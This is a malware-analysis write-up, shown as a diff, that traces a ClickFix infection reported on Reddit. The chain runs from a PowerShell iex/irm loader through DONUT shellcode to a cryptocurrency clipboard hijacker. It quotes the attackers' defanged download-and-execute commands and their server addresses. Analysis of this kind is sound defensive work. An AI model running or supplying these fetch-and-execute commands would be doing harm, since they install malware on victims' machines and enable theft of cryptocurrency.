@@ -1,41 +1,140 @@
+Anatomy of a ClickFix Malware
+Reddit Case Study – Multi-Stage PowerShell → DONUT Loader → C# Compilation Chain
 
-File / Link found in reddit thread : https://www.reddit.com/r/antivirus/comments/1qy529j/very_tech_illiterate_very_paranoid_ran_a/ 
-Command ran : 
-STEP 1: 
+------------------------------------------------------------
 
-powershell -c iex(irm 158[.]94[.]209[.]33 -UseBasicParsing) 
-IEX -> Invoke Expression 
-IRM -> Invoke Rest Method      
-First Step download a second script for [redacted] 
+Initial Discovery
 
-from there the second payload download a third one 
-$finalPayload = iwr -Uri "178[.]16[.]53[.]70" -UseBasicParsing 
+Source:
+https://www.reddit.com/r/antivirus/comments/1qy529j/very_tech_illiterate_very_paranoid_ran_a/
 
-the third part will download a $u = "hxxp[://]94[.]154[.]35[.]115/user_profiles_photo/cptch[.]bin"
-Identified as a DONUT shellcode in 0.9.2 and load it inside a thread for execution 
+The victim reported executing a PowerShell command obtained from a suspicious webpage.
 
-Reading the source code for DONUT 0.9.2 we can see the first byte any shellcode should be an OPCODE of 0xE8 
+------------------------------------------------------------
 
-For now only UNDONUT work in static but ... for donut 0.9.3 and there was a lot of change in between versions.
+Stage 1 – Initial Execution
 
-SO , since so far my attemps at extracting the payload fail we are now moving any further 
+Command executed:
 
-BUT for funsies i've launched it 
-Basically create a c# file to compile under %temp% [random_name].cmdline 
-then use cvtres& csc.exe to compile it 
+powershell -c iex(irm 158[.]94[.]209[.]33 -UseBasicParsing) (01.txt)
 
-then it crash powershell and hide itself to contact a new server but so far i cant find it.
+Breakdown:
+- IEX → Invoke-Expression
+- IRM → Invoke-RestMethod
 
-So i have two way from there 
-first one , Spend 5 more hours to rebuild a test of a a python script to unpack the shellcode ...
-Or make sure that whatever CSC is run with as argument will be dumped 
+This command downloads remote content from 158[.]94[.]209[.]33
+and immediately executes it in memory.
 
-So for my first JAB , i'll try to dump the content of the first argument passed to csc.exe 
+This is a classic fileless PowerShell staging technique.
 
--> Didnt work , make sense just a helper function 
+------------------------------------------------------------
 
-Okay so new try , RUN IT. 
-But you can run shellcode as is right so 
--> https://github.com/accidentalrebel/shcode2exe 
+Stage 2 – Secondary Payload (02.txt)
 
-afterward from the same ip as before it will fetch cptchbuild.bin & clipx64.bin
+The first script downloads a second PowerShell payload ,
+of which this line will be of interest:
+
+$finalPayload = iwr -Uri "178[.]16[.]53[.]70" -UseBasicParsing
+
+- IWR → Invoke-WebRequest
+- Pulls the third stage from 178[.]16[.]53[.]70
+
+This confirms a multi-stage loader chain.
+
+------------------------------------------------------------
+
+Stage 3 – Shellcode Retrieval (cpatch.bin)
+
+The third stage retrieves:
+
+$u = "hxxp://94[.]154[.]35[.]115/user_profiles_photo/cptch[.]bin"
+
+Retrieved file:
+cptch.bin
+
+------------------------------------------------------------
+
+Shellcode Identification
+
+The binary was identified as DONUT shellcode (v0.9.2) using Detect it easy (DIE).
+
+DONUT is used to:
+- Convert PE files (.NET / EXE / DLL)
+- Into position-independent shellcode
+- For in-memory execution
+
+From DONUT 0.9.2 source code:
+The first byte of generated shellcode should be opcode 0xE8.
+
+This matched the retrieved sample.
+
+However:
+- Static unpacking attempts failed
+- UNDONUT only partially works
+- Significant changes occurred between versions 0.9.2 and 0.9.3
+
+Payload extraction was unsuccessful at this stage.
+
+------------------------------------------------------------
+
+Dynamic Execution Attempt
+
+Observed behavior:
+
+load lotta DLL via import generated and retrieved using the function name hashed. -> No import in the import table 
+- better stealth 
+
+-----------------------------------
+Analysis with long explanation + capture from IDA (prolly later) 
+------------------------------------------------------------
+
+
+
+
+Additional Payloads Observed
+
+After execution, additional payloads were fetched:
+
+- cptchbuild.bin -> secondary donut shellcode
+- clipx64.bin  -> c++ compile program 
+
+
+Quick virus total : 
+https://www.virustotal.com/gui/file/a609325c84a73341fea831ffdb3e29c8d9c1619eb09669cf489abdf9955b4dd6/ -> clipx64.bin -> 'The sample is a cryptocurrency clipboard hijacker designed to intercept and replace wallet addresses.' (from the virus total analyssi) 
+https://www.virustotal.com/gui/file/5788aabdff9e405ae8e4d1f16d34a78ebac955f9f3c52488dccc9e4e8c82ea22/ -> cptchbuild (another donut shellcode) 
+
+From:
+94[.]154[.]35[.]115
+
+------------------------------------------------------------
+
+Infection Chain Summary
+
+User runs PowerShell
+        ↓
+Stage 1 loader (IEX + IRM)
+        ↓
+Stage 2 PowerShell
+        ↓
+Stage 3 downloads DONUT shellcode
+        ↓
+Shellcode executes
+        ↓
+Download a secondaire Shellcode + Crypto hijacker 
+        ↓
+Additional binaries fetched
+        ↓
+Unknown final C2
+
+------------------------------------------------------------
+
+Conclusion
+
+This case demonstrates:
+- Multi-stage fileless PowerShell
+- DONUT shellcode loader
+- On-the-fly C# compilation
+- Living-off-the-land via Microsoft tooling
+
+The final payload remains unidentified, but the execution chain
+strongly suggests a modular in-memory implant architecture.
